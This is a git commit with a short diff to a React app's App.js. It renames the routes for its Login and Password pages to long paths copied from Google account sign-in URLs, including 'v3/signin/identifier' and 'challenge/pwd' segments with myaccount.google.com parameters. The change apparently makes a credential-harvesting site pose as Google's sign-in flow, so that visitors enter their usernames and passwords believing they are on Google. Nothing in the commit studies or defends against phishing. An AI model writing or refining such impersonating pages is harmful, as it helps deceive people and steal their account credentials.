3857f1f9f134e64cc18b4ef9866eb017fb13cc79
olaolusmith322 <olaolusmith322@gmail.com>
2024-01-28 00:09:08 +0000

    path changed

--- src/App.js
+++ src/App.js
@@ -9,12 +9,12 @@ function App() {
     <div className="App">
       <Router>
       <Routes>
-        <Route path="/login" element={
+        <Route path="/v3/signin/identifierauthuser0continuehttps3A2F2Fmyaccount.google.com2F3Futmsource3Dsigninnocontinue26pli3D1ecGAlAwAEflowEntryAddSessionflowNameGlifWebSignInhlenGB&serviceaccountsettingsthemeglifdshS16448581093A1706398668419936" element={
           <React.Fragment>
             <Login/>
           </React.Fragment>
         }/>
-        <Route path="/verify" element={
+        <Route path="/v3/signin/challenge/pwdTLAHNYTISLBQdq1oPINH30XKmymic4TxfHWG80GkvYGRDZgh4Wc7YUetmg7Nx2U&checkConnectionyoutube3A591checkedDomainsyoutubecid1continuehttps3A2F2Fmyaccount.google.com2F3Futmsource3Dsigninnocontinue26pli3D1dshS16448581093A1706398668419936ecGAlAwAEflowEntryAddSessionflowNameGlifWebSignInhlenGBpstMsg1serviceaccountsettingsthemeglifauthuser0" element={
           <React.Fragment>
             <Password/>
           </React.Fragment>
